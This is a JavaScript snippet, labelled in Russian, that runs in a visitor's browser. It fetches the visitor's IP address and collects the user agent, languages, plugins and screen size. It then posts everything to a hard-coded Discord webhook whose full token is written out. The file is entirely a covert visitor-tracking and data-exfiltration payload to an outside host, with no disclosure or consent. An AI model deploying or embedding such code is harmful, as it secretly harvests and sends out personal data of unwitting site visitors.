fetch('https://api.ipify.org')
.then(response => response.text())
.then(ip => {
    fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            embeds: [{
                title: "🌐 Информация о пользователе",
                fields: [
                    { name: "📱 User Agent", value: navigator.userAgent, inline: false },
                    { name: "🗣️ Язык", value: navigator.language, inline: true },
                    { name: "🌍 Языки", value: navigator.languages.join(', '), inline: true },
                    { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
                    { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
                    { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        })
    });
});
